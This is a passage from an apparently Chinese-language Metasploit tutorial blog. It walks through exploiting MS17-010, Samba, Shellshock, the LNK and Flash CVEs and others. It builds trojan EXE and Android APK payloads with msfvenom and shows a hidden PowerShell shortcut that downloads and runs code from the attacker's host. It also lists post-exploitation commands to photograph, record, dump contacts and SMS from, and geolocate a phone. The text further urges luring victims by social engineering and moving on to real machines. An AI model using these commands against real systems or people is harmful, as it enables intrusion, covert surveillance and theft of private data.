fa-link"></i></a>2.3.9.Scripts</h3>      <p>这个目录下的文件大都是Meterpreter这个模块利用的脚本，比如Meterpreter里用到的migrate来转移到其他进程的指令的源代码就在这个目录下。</p><p>这里的rc脚本相当于Windows下的批处理脚本, 在某些情况下会有一定便捷性。比如Veil 在生成免杀payload的同时也会生成一个rc脚本，此时使用msfconsole -r xx.rc便可以快速的建立一个和payload对应的handler ,亦或在攻击过程中需要你反复的set exploit,那么就可以使用这个批处理脚本了,而这个目录下则是一些给定的rc脚本,虽然你可能不习惯这样使用,但作为改写自己的rc脚本的资源也不错。</p>        <h3 id="2-3-10-TOOLS">          <a href="#2-3-10-TOOLS" class="heading-link"><i class="fas fa-link"></i></a>2.3.10.TOOLS</h3>      <p>包含一些有用的脚本和零散的工具。</p>        <h1 id="三-MSF基本命令">          <a href="#三-MSF基本命令" class="heading-link"><i class="fas fa-link"></i></a>三.MSF基本命令</h1>              <h2 id="3-1-Msfconsole控制台">          <a href="#3-1-Msfconsole控制台" class="heading-link"><i class="fas fa-link"></i></a>3.1.Msfconsole控制台</h2>      <p>它是一个一体化集中控制台，允许你访问到几乎所有的MSF框架选项。MSF起初看似吓人的,但一旦你学习他的语法命令,你将会欣赏利用该接的力量。</p>        <h2 id="3-2-Msfconsole的好处">          <a href="#3-2-Msfconsole的好处" class="heading-link"><i class="fas fa-link"></i></a>3.2.Msfconsole的好处</h2>      <p>这是唯一能访问大多数支持在MSF特点。</p><p>Console- based界面提供了一个框架。</p><p>具有最稳定的MSF界面。</p><p>充分支持Readline，Tabbing以及其他各类命令。</p><p>支持Msfconsole外部命令执行。</p>        <h2 id="3-3-Msfconsole命令">          <a href="#3-3-Msfconsole命令" class="heading-link"><i class="fas fa-link"></i></a>3.3.Msfconsole命令</h2>      <p>？：命令帮助，可以使用的命令</p><p>在？后面加命令(和前面的？有空格)：可以解释该命令的含义</p><p>search：搜索模块名和描述</p><p>use：+模块路径和模块本身  -&gt;使用该模块</p><p>进入模块：info -&gt; 查阅该模块信息      / check  -&gt;   检测</p><p>back：从当前环境（模块环境）返回 ，返回到上一级目录（类似于 .. )</p><p>banner：显示MSF的banner的信息</p><p>color：颜色转换</p><p>connect：+IP地址或者域名+端口号   -&gt; 连接主机</p><p>exit/quit：退出MSF</p><p>irb：进入irb脚本模式</p><p>jobs：显示和管理作业（和windows下的任务管理器的进程作用一样）</p><p>kill：+进程名字 -&gt; 杀死一个作业（和结束进程作用一样）</p><p>loadpath：加载一个模块的路径</p><p>load：加载一个插件</p><p>upload：卸载一个模块</p><p>resource：运行储存一个文件中的命令</p><p>route：查看一个会话的路由信息</p><p>save：保存动作</p><p>set：给一个变量赋值   （如：set RHOST 192.168.133.133)</p><p>unset：解除一个或多个变量</p><p>setg：把一个赋值给全局变量，例如上述的set 设置的IP，就会用到其他攻击模块的RHOST中。</p><p>unsetg：解除一个或多个全局变量</p><p>sleep：在限定秒数内什么也不做</p><p>show：显示所有类型的模块</p><p>version：显示MSF和控制台库的版本</p>        <h1 id="四-Exploits-And-Payloads-模块">          <a href="#四-Exploits-And-Payloads-模块" class="heading-link"><i class="fas fa-link"></i></a>四.Exploits And Payloads 模块</h1>      <p>show + 模块名(s) -&gt; 查看该模块下可以使用的</p>        <h2 id="4-1-Exploits-模块">          <a href="#4-1-Exploits-模块" class="heading-link"><i class="fas fa-link"></i></a>4.1.Exploits 模块</h2>      <p>命名规则:系统/服务/名称<br>例如: windows/smb/ms08_067_netapi </p><p>RHOST :目标主机IP地址</p><p>RPORT :目标主机连接端口。</p><p>Payload :有效的载荷,成功后返回shell.</p><p>LHOST :攻击者的IP地址（我们自己就是攻击者）</p><p>LPORT :攻击者的端口</p><p>SRVHOST：攻击者自己搭建的服务器的IP地址</p><p>SRVPORT：攻击者自己搭建的服务器的端口号</p><p>SSL：证书</p><p>URIPATH：路径</p>        <h2 id="4-2-Payloads-模块">          <a href="#4-2-Payloads-模块" class="heading-link"><i class="fas fa-link"></i></a>4.2.Payloads 模块</h2>      <p>是在使用一个模块之后再去使用的。</p><p>命名规则:系统/类型/名称<br>例如: Windows/dllinject/reverse tcp.</p><p>类型命名规则<br>shell：上传一个shell,。<br>dllinject：注入一个dll到进程。<br>patchup*** ：修补漏洞。。<br>upexec：上传并执行一个文件。<br>meterpreter ：高级的payload。<br>vncinject ：高级的payload。<br>passive ：高级的payload。</p><p>名称的命名规则<br>shell find tag在一个已建立的连接上创建一个shell,<br>shell reverse_tcp:反向连接到攻击者主机并创建一个shell<br>bind_tcp:监听一个tcp连接。<br>reverse_tcp:反向建立tcp连接。<br>reverse_http通过HTTP隧道通信并创建一个新用户添加到管理组。<br>add_user创建一个新用户并添加到管理组。<br>xxx_ipv6_tcp:基于IPV6<br>xxx_nonx_tcp:no execute或win7 ( NX是应用在CPU的一种可以防止缓冲区溢出的技术)<br>xxx_ord_tcp:有序payload。<br>xxx_tcp_allports:在所有可能的端口。</p>        <h1 id="五-MSF漏洞实例测试">          <a href="#五-MSF漏洞实例测试" class="heading-link"><i class="fas fa-link"></i></a>五.MSF漏洞实例测试</h1>      <p>三种攻击实例</p>        <h2 id="5-1-网络服务器攻击渗透（MS08-067">          <a href="#5-1-网络服务器攻击渗透（MS08-067" class="heading-link"><i class="fas fa-link"></i></a>5.1.网络服务器攻击渗透（MS08_067)</h2>      <p>用到的靶机：WinXPenSP3</p><p>首先，执行msfconsole命令：msfconsole</p><p>接着，搜索ms08_067目录：search ms08_067</p><p>然后，</p>        <h2 id="5-2-浏览器攻击渗透（MS10-018">          <a href="#5-2-浏览器攻击渗透（MS10-018" class="heading-link"><i class="fas fa-link"></i></a>5.2.浏览器攻击渗透（MS10_018)</h2>      <p>用到的靶机：WinXPenSP3</p><p>首先，执行msfconsole命令：msfconsole</p><p>接着，搜索ms10_018目录,搜索模块路径：search ms10_018</p><p>然后，进入搜索到的模块：use + 模块路径</p><p>查看该模块使用以及会影响win的详细信息：show options</p><p>设置自己服务器IP：set SRVHOST + IP地址(这里就填kali的IP，一般来说填公网IP地址)</p><p>设置一下端口，为了方便识别：例如：set LPORT 4441</p><p>设置一个payload正向连接shell：例如：set PAYLOAD windows/meterpreter/bind_tcp</p><p>再看我们payload的选项配置：show options 一下（就是可以看到我们上面是否把配置的参数放进去了）</p><p>run 一下，会有一个 url 地址，这个地址就是要通过社工等方法让目标机进行访问（抛出一个诱导，让肉机访问）（当肉机点击访问后，我们就有可能得到肉机的系统权限）</p><p>查看我们得到的肉机信息：sessions -i</p><p>进入肉机系统：sessions -i +肉机编号（看有多少台机器上钩）</p>        <h2 id="5-3-应用软件格式渗透，利用word去渗透（MS10-087">          <a href="#5-3-应用软件格式渗透，利用word去渗透（MS10-087" class="heading-link"><i class="fas fa-link"></i></a>5.3.应用软件格式渗透，利用word去渗透（MS10_087)</h2>      <p>用到的靶机：WinXPenSP3</p><p>首先，执行msfconsole命令：msfconsole</p><p>接着，搜索ms10_087目录,搜索模块路径：search ms10_087</p><p>然后，使用这个模块：use + 模块及它的路径</p><p>查看该模块使用以及会影响win的详细信息：show options（看看要设置哪些信息）</p><p>设置需要设置的信息，显然这个模块要设置文件名（如果不设置就是保持它原本的默认名）</p><p>设置一个payload，前面我们都是设置的交互式的，这里我们换一个payload：例如：set payload windows/exec</p><p>再看我们payload的选项配置：show options 一下（就是可以看到我们上面是否把配置的参数放进去了）,这里也会提示我们还要设置什么payload选项</p><p>这里出现还要我们设置CMD：这是处于win类似元终端执行的命令，比如我们执行弹出一个计算器：set CMD calc.exe</p><p>run一下，我们就会得到word文档，就是我们之前自己设计的文件名，它会告诉我们生成文件的位置</p><p>然后我们可以把它拷贝到home里：home:mv +文件路径/home/，然后再托到本机，就可以看出效果了</p>        <h2 id="5-4-网路服务器攻击渗透测试（MS17-010">          <a href="#5-4-网路服务器攻击渗透测试（MS17-010" class="heading-link"><i class="fas fa-link"></i></a>5.4.网路服务器攻击渗透测试（MS17_010)</h2>      <p>用到的靶机：Win7</p><p>首先，执行msfconsole命令：msfconsole</p><p>接着，搜索ms17_010目录,搜索模块路径：search ms17_010（这个就是之前的永恒之蓝）</p><p>然后，使用这个模块：use + 模块及它的路径</p><p>查看该模块使用以及会影响win的详细信息：show options（看看要设置哪些信息）</p><p>设置需要设置的信息：set RHOST，LHOST(这个不是必须设置的，要求上没有它，但是还是设置一下)</p><p>设置一个payload，设置一个64位的：set payload windows/x64/meterpreter/reverse_tcp（反向连接，只要被攻击机存在漏洞时，就会反向连接到攻击机上）</p><p>再看我们payload的选项配置：show options 一下（就是可以看到我们上面是否把配置的参数放进去了）,这里也会提示我们还要设置什么payload选项。</p><p>run一下，当我们进入了meterpreter模式，就说明我们拿到了shell，shell 一下，我们就直接进入到别人的系统</p>        <h2 id="5-5-利用-samba-服务漏洞入侵-Linux-主机（CVE-2017-7494-与-samba-低版本漏洞利用）">          <a href="#5-5-利用-samba-服务漏洞入侵-Linux-主机（CVE-2017-7494-与-samba-低版本漏洞利用）" class="heading-link"><i class="fas fa-link"></i></a>5.5.利用 samba 服务漏洞入侵 Linux 主机（CVE-2017-7494 与 samba 低版本漏洞利用）</h2>      <p>Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件 ，由服务器及客户端程序构成samba服务对应的端口有139，445等等。本文将简单介绍metasploit利用samba漏洞入侵进入远程linux主机。</p><ol><li><p>首先要扫描目标主机上开放的端口和服务,用nmap,命令如下:<br>nmap -sS -Pn -A 192.168.133.133</p></li><li><p>发现主机上开放的139 , 445端口之后,说明该主机有可能存在samba服务远程溢出漏河，尝试通过该端口建立一个meterpreter会话，需要用到metasploit。</p></li><li><p>打开metasploit之后需要先判断samba的版本，命令如下:</p><p>msf&gt; search auxiliary/scanner/samba </p><p>这条命令用来查找samba相关exploit 参数</p></li><li><p>然后使用如下命令来定义要扫描samba的版本所用到的exploits参数</p><p>msf&gt; use auxiliary/scanner/smb/smb_version</p><p>msfauxiliary(smb_version) &gt; set RHOSTS 192.168.133.xxx（这两步是扫描这个肉鸡是否能被攻击）</p><p>这条命令定义你将要扫描samba版本的远程主机的IP地址。</p><p>exploit  ：开始漏洞利用</p></li><li><p>发现samba版本之后,我们需要进一步利用来入侵进入到远程linux主机</p><p>msf&gt; use exploit/multi/samba/usermap_script<br>msf exploit(usermap_script) &gt; set RHOST 192.168.133.xxx</p><p>msf exploit(usermap script) &gt; exploit</p><p>执行完成以上命令如图所示,成功创建了shell 会话。</p></li></ol><p>（二）smb 其他漏洞 Linux smb 漏洞（CVE-2017-7494）复现</p><p>漏洞编号： CVE-2017- 7494.<br>漏洞等级：严重<br>影响版本：漏洞影响了Samba 3.5.0之后的版本，不包含4.6.4/4.5.10/4.4.14</p><ol><li><p>查看samba版本</p><p>samba -V     #查看samba版本</p></li><li><p>打开samba配置文件添加以下配置，配置共享：</p><p>vi /etc/samba/smb.conf</p><p>在末行加入：</p><p>[public]</p><pre><code>comment = publicbrowseable = yeswriteable =yespath = /tmp/publicpublic = yesread only = no</code></pre><p>:wq  #保存退出</p></li><li><p>Kali Linux 2017里面创建Samnba共享目录，创建共享目录</p><p>创建共享目录：mkdir /tmp/public</p><p>修改执行读写权限：chmod 777 /tmp/public/</p><p>这是 SambaCry 漏洞利用的前提，必须有一个共享目录，这样攻击者就可以在共享目录下传递攻击代码并执行，获得root 权限并控制肉鸡。</p></li><li><p>Kali Linux 2017 重启/ 启动 Samba 服务</p><p>重启 Samba 服务：/etc/init.d/samba restart</p><p>查看 Samba 进程：ps aux | grep samba</p><p>查看Samba 端口状态：netstat -tnlp samba（采用445和139端口）</p></li><li><p>更新MSF 后使用”exploit/linux/samba/is_known_pipename”利用模块，设置 rhost 后直接 exploit 即可得到 shell</p></li></ol><p>注意：有的 poc 会存在32位和64位之分，1-4的步骤是在肉鸡上的操作（被攻击的Linux机）</p>        <h2 id="5-6-Bash-Shellshock-CVE-2014-6271（破壳）">          <a href="#5-6-Bash-Shellshock-CVE-2014-6271（破壳）" class="heading-link"><i class="fas fa-link"></i></a>5.6.Bash Shellshock CVE_2014_6271（破壳）</h2>      <p>Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞。启动Bash的时候不但会导入这个函数，而且也会把函数定义后面的命令执行。在有些CGI脚本的设计中,数据是通过环境变量来传递的,这样就给了数据提供者利用Shellshock漏洞的机会。</p><p>简单来说就是由于服务器的cgi脚本调用了bash命令,由于bash版本过低,攻击者把有害数据写入环境变量,传到服务器端,触发服务器运行Bash脚本,完成攻击。</p><p><strong>本次实战环境：</strong></p><p>metasploitable2 是一个非常不错的靶机 ,内置了多种漏洞来练习你的黑客技术。我将在独立网络环境中使用kali来攻击它,建议你也跟我一样, 确保在第一次尝试攻击时结果和我一样，等技术娴熟后就可以渗透真实的机器了。</p><ol><li><p>第一步：配置靶机</p><p>要利用此漏洞，要在 cgi-bin 目录下有一个可执行脚本，一个简单的输出 ”hello world ”脚本即可，因为仅仅是作为演示，进入靶机的 /usr/lib/cgi-bin/ 目录下，输入以下命令：</p><p>命令：sudo nano hello.sh</p><p>输入正确的密码后，对hello.sh 进行编辑：</p><p>#! /bin/bash</p><p>echo “Content-type:text/html”</p><p>echo “”</p><p>echo “Hello World !”</p><p>保存好后，赋予脚本可执行权限，用 chmod 命令：sudo chmod 775 hello.sh</p><p>我们来验证以下，通过浏览器访问该脚本，可以看到已经成功执行:192.168.133.139/cgi-bin/hello.sh</p></li><li><p>第二步：准备攻击</p><p>在kali中，进入 metasploit ：msfconsole</p><p>我们可以通过 search 来搜索 exploits ，输入search shellshock ,这样就能搜索到 apache_mod_cgi_bash_env_exec 模块</p><p>输入 ：show options 来查看该模块要配置的东西</p><p>大部分是选择默认配置，这里只要配置远程 RHOSTS ，本地监听的IP  LHOST和文件路径 targeturi ：set targeturi /cgi-bin/hello.sh</p><p>设置了本地IP LHOST，就得设置payload ，命令：set payload linux/x86/shell/reverse_tcp</p></li><li><p>第三步：getshell</p><p>一些 metasploit 模块有一个非常便利的小功能，就是检测靶机是否有漏洞，输入 check 命令检测即可，这将会把靶机是否存漏洞检测出来。</p><p>输入：exploit 命令进行攻击</p></li></ol>        <h2 id="5-7-PHP-CGI-漏洞利用">          <a href="#5-7-PHP-CGI-漏洞利用" class="heading-link"><i class="fas fa-link"></i></a>5.7.PHP CGI 漏洞利用</h2>      <p>一般通过 phpinfo 来查看是否符合CGI漏洞利用，通常看 Server API ：CGI / *，CGI是服务器的扩展功能（比如：留言板提交，IIS/Windows 的php 要用到）</p><p>靶机：metasploitable2</p><p>命令：</p><p>msf &gt; search cve:2012-1823</p><p>msf &gt; use exploit/multi/http/php_cgi_arg_injection</p><p>msf exploit(php_cgi_arg_injection) &gt;show options</p><p>msf exploit(php_cgi_arg_injection) &gt; set RHOSTS 192……</p><p>msf exploit(php_cgi_arg_injection) &gt; run(或者exploit)</p>        <h2 id="5-8-Java-RMI-SERVER-命令执行漏洞与-java-cve-2013-0422">          <a href="#5-8-Java-RMI-SERVER-命令执行漏洞与-java-cve-2013-0422" class="heading-link"><i class="fas fa-link"></i></a>5.8.Java RMI SERVER 命令执行漏洞与 java cve_2013_0422</h2>      <p>Java RMI SERVER 的 RMI 注册表 和 RMI 激活服务的默认配置存在安全漏洞，导致代码执行</p><p>利用步骤：</p><p>nmap -p0-65535 IP，查看 1099 端口是否开启</p><p>msf &gt; use exploit/muti/misc/java_rmi_server</p><p>msf exploit(java_rmi_server) &gt; set RHOSTS IP</p><p>msf exploit(java_rmi_server) &gt; exploit</p><p>meterpreter &gt;shell</p><p><strong>二. java cve:2013-0422</strong></p>        <h2 id="5-9-Distcc-后门漏洞利用">          <a href="#5-9-Distcc-后门漏洞利用" class="heading-link"><i class="fas fa-link"></i></a>5.9. Distcc 后门漏洞利用</h2>      <p>安全组织索引：CVE-2004-2678，OSVDB-13378</p><p>Distcc 用于大量代码在网络服务器上的分布式编译,但是如果配置不严格，容易被滥用执行命令，该漏洞是Xcode 1.5 版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制</p><p>利用步骤:<br>启动 metasploit</p><p>使用 exploit/unix/misc/distcc_exec 模块</p><p>set RHOSTS IP</p><p>exploit 执行攻击</p><p>id 查看权限， uname -a 验证</p>        <h2 id="5-10-Druby-命令执行">          <a href="#5-10-Druby-命令执行" class="heading-link"><i class="fas fa-link"></i></a>5.10.Druby 命令执行</h2>      <p>Druby 配置不当，被滥用执行命令。（Druby 是开发语言，后缀名 .rb）</p><p>利用步骤：</p><p>metasploit 启动</p><p>发现 8787 druby 端口</p><p>search drb 搜索drb 相关漏洞，找最新模块并利用 use </p><p>set URL druby:IP:8787    # 设置目标druby链接    ：druby://ip地址：8787（可设置可不设置，有可能设置后还攻击不了）</p><p>set RHOSTS IP</p><p>exploit   攻击</p>        <h2 id="5-11-CVE-2017-8464-震网三代-（远程快捷方式漏洞）">          <a href="#5-11-CVE-2017-8464-震网三代-（远程快捷方式漏洞）" class="heading-link"><i class="fas fa-link"></i></a>5.11. CVE_2017_8464 震网三代 （远程快捷方式漏洞）</h2>      <p><strong>漏洞详情:</strong><br>北京时间2017年6月13日凌晨，微软官方发布6月安全补丁程序，“震网三代” LNK 文件远程代码执行漏洞(CVE-2017-8464)和Windows搜索远程命令执行漏洞(CVE-2017-8543) </p><p>CVE-2017-8543,当Windows搜索处理内存中的对象时，存在远程执行代码漏洞。成功利用此漏洞的攻击者可以控制受影响的系统。</p><p>CVE-2017-8464,当Windows系统在解析快捷方式时，存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危。</p><p>攻击机：kali</p><p>靶机：win7</p><p>受影响的版本：win7，win8.1，win RT 8.1，win10，win Server 2008，win Server 2008 R2，win Server 2012，win Server 2012 R2，win Server 2016</p><p><strong>步骤：</strong></p><p>search 2017_8464</p><p>use exploit/windows/fileformat/cve_2017_8464_lnk_rce</p><p>set LHOST </p><p>run</p><p>它会生成以一堆快捷方式，我们要先把它们拷到 home 下，再拷到 window里（肉鸡）：mv /…/ /home</p><p>然后，再msf中设置监听：</p><p>search multi/handler</p><p>use exploit/multi/handler</p><p>set payload windows/meterpreter/reverse_tcp</p><p>set LHOST</p><p>run </p><p>等待wins 点击快捷方式，当反shell 后会自动到 meterpreter 模式</p><p><strong>payload2：利用powershell 快捷键</strong></p><p>生成攻击文件，终端输入：</p><p>msfvenom -p windows/meterpreter/reverse_tcp lhost=ip -f psh-reflection&gt;/opt/search.psl(exe类型的也可以)</p><p>然后，将 /opt/目录下的 search.psl 移到 /var/www/html/ 下：mv /opt/search.psl /var/www/html</p><p>随后打开 Apache 服务：service apache2 start</p><p>通过 web 访问 search.psl 文件 ：192.168.133.128/search.psl</p><p>然后，在目标机器windows 上建一个快捷方式：</p><p>右击新建快捷方式，输入的对象位置：powershell -windowstyle hidden -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<span class="exturl"><a class="exturl__link" href="http://192.168.133.128/search.psl&#39;);test.psl&quot;">http://192.168.133.128/search.psl&#39;);test.psl&quot;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>或者用工具：shortcut exploit builder</p>        <h2 id="5-12-flash-0day-CVE-2018-4878">          <a href="#5-12-flash-0day-CVE-2018-4878" class="heading-link"><i class="fas fa-link"></i></a>5.12. flash 0day (CVE-2018-4878)</h2>      <p><strong>漏洞详情：</strong></p><p>Adobe公司在当地时间2018年2月1日发布了一条安全公告:<span class="exturl"><a class="exturl__link" href="http://helpx.adobe.com/security/products/flash-player/apsa18-01.html%E3%80%82%E5%85%AC%E5%91%8A%E7%A7%B0%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84Flash">http://helpx.adobe.com/security/products/flash-player/apsa18-01.html。公告称一个新的Flash</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 0Day漏洞(CVE-2018-4878)已经存在野外利用，可针对Windows用户发起定向攻击。攻击者可以诱导用户打开包含恶意Flash代码文件的Microsoft Office文档、 网页、垃圾电子邮件等。</p><p><strong>漏洞影响：</strong></p><p>Flash Player 28.0.0.137 及其以前的所有版本</p><p><strong>漏洞复现：</strong></p><p>攻击机：kali</p><p>目标靶机：win7 + IE8.0 + Flash Player 28.0.0.137</p><ol><li><p>下载 cve-2018-4878 步骤：</p><p> <span class="exturl"><a class="exturl__link" href="https://raw.githubusercontent.com/backlion/demo/master/CVE-2018-4878.rar">https://raw.githubusercontent.com/backlion/demo/master/CVE-2018-4878.rar</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> （win7 中下载）</p></li><li><p>解压文件后可以看到 cve-2018-4878.py 和 exploit.swf ，我们只需要 cve-2018-4878.py</p></li><li><p>我们需要对 cve-2018-4878.py 进行修改，原作者将 stageless 变量改为了 Ture ,我们要把它改为 stageless = False，另外不能忘记修改最后的路径，py 中是 f=open(“root/2/index.html”,”wb”)，我们 kali 中没有这个路径，所以在 kali 中要创建一个：mkdir /root/2/</p></li><li><p>在 kali 中生成 msf 的 shellcode （一定要注意：在老版本的kali 中生成的为333字节的 payload）</p><p>命令：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.133.128 lport=4444 -f python&gt;shellcode.txt</p></li><li><p>然后要替换原来的 shellcode ,就是把生成的 shellcode.txt 里面的代码替换到 cve-2018-4878.py 中</p></li><li><p>接着，把cve-2018-4878.py 放到 /root/2 的文件夹里</p></li><li><p>在kali 中执行 cve-20018-4878.py 这个脚本，即可在同一目录下生成恶意的 swf 文件</p></li><li><p>然后，将生成的文件放到 win7 中，用IE 浏览器打开</p></li><li><p>在 msf 中设置监听</p><p>use exploit/multi/handler</p><p>set payload windows/meterpreter/reverse_tcp </p><p>set LHOST,LPORT 4444(这个要和先前配置的端口一致)</p><p>exploit</p></li></ol>        <h2 id="5-13-生成-exe-的木马文件">          <a href="#5-13-生成-exe-的木马文件" class="heading-link"><i class="fas fa-link"></i></a>5.13. 生成 exe 的木马文件</h2>      <p>命令：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.133.128 lport=6789 -f exe -o /root/payload.exe</p><p>这是把木马程序存放于 kali 中，想办法传送到 win 10 中，并让其执行</p><p>设置监听：</p><p>msf&gt; use exploit/multi/handler</p><p>set payload windows/x64/meterpreter/reverse_tcp</p><p>set LHOST 192.168.133.128</p><p>run</p>        <h2 id="5-14-渗透-Android-系统">          <a href="#5-14-渗透-Android-系统" class="heading-link"><i class="fas fa-link"></i></a>5.14. 渗透 Android 系统</h2>              <h3 id="5-14-1-渗透步骤">          <a href="#5-14-1-渗透步骤" class="heading-link"><i class="fas fa-link"></i></a>5.14.1. 渗透步骤</h3>              <h4 id="1-内网渗透">          <a href="#1-内网渗透" class="heading-link"><i class="fas fa-link"></i></a>1. 内网渗透</h4>      <ol><li><p>首先要把 Kali 攻击机 配置为 桥接模式，因为渗透 Android 系统 要在局域网下，所以 kali ，物理机，Android 要在同一网段下，这样三者之间可以互相 ping 通。</p><p>同一个局域网就是要在同一个 WIFI 下。</p></li><li><p>kali 机器要生成攻击脚本：</p><p>命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.111 LPORT=9999 R&gt;/root/test.apk</p><p>生成一个 apk 的脚本后，存放在 root 的目录下，复制到 window中，通过 QQ 发送到手机上，下载安装运行</p></li><li><p>这时，kali 要设置监听：</p><p>进入 msfconsole</p><p>使用 exploit/multi/handler 模块：use exploit/multi/handler</p><p>设置payload：set payload android/meterpreter/reverse_tcp</p><p>设置监听的攻击机 IP：set LHOST 192.168.0.111</p><p>设置监听端口：set LPORT 9999                      （IP 和 端口和上面脚本设置一致）</p><p>渗透：run  /  exploit</p><p>当脚本在手机中被运行时，kali 就会接受到信号，进入 meterpreter 的命令行</p></li></ol>        <h4 id="2-外网渗透">          <a href="#2-外网渗透" class="heading-link"><i class="fas fa-link"></i></a>2. 外网渗透</h4>      <ol><li><p>首先我们需要下载一个用于内网穿透的工具来进行端口映射与转发。</p><p>这里就用 Ngrok ，这个软件可以有免费版的（网速不行，不稳定，自娱自乐吧）</p><p>在官网上注册并登录（<span class="exturl"><a class="exturl__link" href="https://www.ngrok.cc/#down-client%EF%BC%89">https://www.ngrok.cc/#down-client）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></li><li><p>kali进入 ngrok 查看连接状态，命令：</p><p>./sunny clientid 你的id（这个id 在 ngrok 隧道管道中可以看到）</p><p>利用转发的 tcp 和端口号</p></li><li><p>kali 机器要生成攻击脚本：</p><p>命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=free.idcfengye.com LPORT=10227 R&gt;/home/haoye/haoye.apk</p><p>生成一个 apk 的脚本后，存放在 /home/haoye 的目录下，复制到 window中，通过 QQ 发送到手机上，下载安装运行</p></li><li><p>kali 要设置监听（和上面内网渗透设置步骤一样）</p></li></ol><p>Ngrok 注册安装可以看：<span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/weixin_45798017/article/details/108564464">https://blog.csdn.net/weixin_45798017/article/details/108564464</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="5-14-2-后期-处理">          <a href="#5-14-2-后期-处理" class="heading-link"><i class="fas fa-link"></i></a>5.14.2. 后期 处理</h3>      <ol><li><p>手机拍照</p><p>webcam_list              #查看摄像头  （1 是后置，2是前置，但是我没看出什么不同）</p><p>webcam_snap 1/2      #拍照</p><p>webcam_stream 1/2   #摄像，录视频</p></li><li><p>手机录音</p><p>record_mic</p></li><li><p>查看Android手机是否已经执行root权限</p><p>check_root</p></li><li><p>导出Android手机的电话本</p><p>dump_contacts</p></li><li><p>导出Android手机的短信记录</p><p>dump_sms</p></li><li><p>远程控制目标手机发送短信</p><p>send_sms -d 其他手机号 -t “内容”</p></li><li><p>对目标手机进行定位，查看目标手机位置信息</p><p>geolocate</p></li><li><p>查看所有可执行命令</p><p>?</p></li></ol><p>优点：该脚本不会报毒</p><p>弊端：上面的操作都得有权限，也就是手机下桌面的这个脚本的信息中的权限光有 “询问” 的权限是不够的，必须是 “允许”。</p>        <h1 id="六-拓展：Auxiliary（辅助）模块">          <a href="#六-拓展：Auxiliary（辅助）模块" class="heading-link"><i class="fas fa-link"></i></a>六.拓展：Auxiliary（辅助）模块</h1>      <p><strong>Auxiliary模块</strong></p><p>情报搜集阶段,这一阶段主要是尽可能多的收集目标的各种信息。这里主要用到Msf里auxiliary里边的Modules，这里的Modules都是一些渗透前期的辅助工具。一般的收集信息可以使用Whois(这个是Linux 自带的)，db_ nmap这个是Msf的一个插件) ,如果要使用到其他的一些收集信息的方法，比如使用Syn(一种不建立头层皮连接的扫描)扫描，可以在Msfconsole里边Search syn然后根据返回结果来确定使用哪个模块。</p><ol><li><p>Whois信息探测：在Mstconsole下使用Whois查看域名(domin) / IP信息。：whois + 域名/IP</p></li><li><p>利用模块查找邮箱：use auxiliary/gather/search_email_collector</p></li><li><p>因为 Google 国内引擎关闭了，所以我们设置不用Google引擎：set SEARCH_GOOGLE false(不关闭的话搜索时间就长一些)，然后 run 进行搜索</p></li><li><p>使用 auxiliary 下的搜索 DNS 的模块：use auxiliary/gather/enum_dns，设置DNS时不要加www，然后 run 进行爆破</p></li></ol>        <h1 id="七-拓展：Nmap-端口扫描-模块">          <a href="#七-拓展：Nmap-端口扫描-模块" class="heading-link"><i class="fas fa-link"></i></a>七. 拓展：Nmap (端口扫描) 模块</h1>      <p>msf 内置 nmap 端口扫描模块，效果和 kali 中自带的 nmap 是一致的</p>        <h2 id="7-1-Syn-扫描">          <a href="#7-1-Syn-扫描" class="heading-link"><i class="fas fa-link"></i></a>7.1 Syn 扫描</h2>      <p>如果TCP 扫描访问被拦截，就可以利用 syn 扫描（不建立连接的扫描）</p><p>扫描器向目标主机的一个端口发送请求连接的 SYN 包，扫描器在收到 SYN / ACK 后，不是发送的 ACK 应答而是发送RST 包请求断开连接。这样，三次握手就没有完成，无法建立正常的 TCP 连接，因此，这次扫描就不会被记录到系统日志中。这种扫描技术一般不会在目标主机上留下扫描痕迹。但是，这种扫描需要有 root 权限。<br>TCP connect 端口扫描服务端与客户端建立连接成功(目标端口开放)</p><p><strong>过程:</strong></p><ol><li>Client 端发送SYN;</li><li>Server端返回SYN/ACK，表明端口开放;（如果返回 RST/ACK 表明端口未开放）</li><li>Client端返回ACK，表明连接已建立；</li><li>Client端主动断开连接。</li></ol><p><strong>优点：</strong></p><p>SYN扫描要比TCP Connect()扫描隐蔽些,SYN仅仅需要发送初始的SYN数据包给目标主机,如果端口开放,则相应SYN-ACK数据包;如果关闭，则响应 RST 数据包。</p><p><strong>步骤：</strong></p><ol><li>use auxiliary/scanner/portscan/syn</li><li>set RHOSTS 192.168.134.1..</li><li>set THREADS 100   #设置线程，默认的是1，这里我们设置成100</li><li>run  进行扫描</li></ol>        <h2 id="7-2-Tcp-扫描">          <a href="#7-2-Tcp-扫描" class="heading-link"><i class="fas fa-link"></i></a>7.2 Tcp 扫描</h2>      <ol><li>use auxiliary/scanner/portscan/tcp</li><li>set RHOSTS</li><li>set THREADS 100</li><li>run 进行扫描</li></ol>        <h1 id="八-服务版本信息探索">          <a href="#八-服务版本信息探索" class="heading-link"><i class="fas fa-link"></i></a>八. 服务版本信息探索</h1>              <h2 id="8-1-SMB-版本扫描">          <a href="#8-1-SMB-版本扫描" class="heading-link"><i class="fas fa-link"></i></a>8.1. SMB 版本扫描</h2>      <ol><li>执行 use auxiliary/scanner/smb/smb_version</li><li>show options  查看要哪些配置</li><li>set RHOSTS IP</li></ol>        <h2 id="8-2-SSH-版本扫描">          <a href="#8-2-SSH-版本扫描" class="heading-link"><i class="fas fa-link"></i></a>8.2. SSH 版本扫描</h2>      <ol><li>执行 use auxiliary/scanner/ssh/ssh_version</li><li>show options  